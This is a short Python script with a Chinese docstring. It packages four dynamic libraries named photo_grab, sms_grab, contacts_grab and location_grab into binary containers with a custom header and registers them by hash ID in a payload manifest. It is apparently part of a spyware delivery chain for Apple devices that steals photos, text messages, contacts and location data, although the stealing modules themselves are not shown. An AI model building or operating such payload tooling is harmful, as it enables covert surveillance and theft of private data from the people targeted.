"""一键打包所有 grab dylib"""
import struct, os, json

GRABS = [
    ('photo_grab',    'feedbeeffeedbeeffeedbeeffeedbeeffeedbeef'),
    ('sms_grab',      'deadbeefdeadbeefdeadbeefdeadbeefdeadbeef'),
    ('contacts_grab', 'cafebabeccafebabeccafebabeccafebabeccafebabec'),
    ('location_grab', 'faceb00cfaceb00cfaceb00cfaceb00cfaceb00c'),
]

with open('payloads/manifest.json', 'r') as f:
    manifest = json.load(f)

for name, hash_id in GRABS:
    dylib_path = f'payloads/{name}.dylib'
    out_dir    = f'payloads/{name}'
    out_bin    = f'{out_dir}/raw.bin'

    if not os.path.exists(dylib_path):
        print(f'SKIP {name}.dylib (not found)')
        continue

    os.makedirs(out_dir, exist_ok=True)

    with open(dylib_path, 'rb') as f:
        data = f.read()

    buf = bytearray()
    buf += struct.pack('<I', 0xF00DBEEF)
    buf += struct.pack('<I', 1)
    buf += struct.pack('<I', 524288)
    buf += struct.pack('<I', 3)
    buf += struct.pack('<I', 16)
    buf += struct.pack('<I', len(data))
    buf += data

    with open(out_bin, 'wb') as f:
        f.write(buf)

    manifest[hash_id] = [{'file': 'raw.bin', 'raw': True, 'size': len(buf)}]
    print(f'{name}: {len(data)}B dylib → {len(buf)}B container ({hash_id[:12]}...)')

with open('payloads/manifest.json', 'w') as f:
    json.dump(manifest, f, indent=2)
print('Done!')
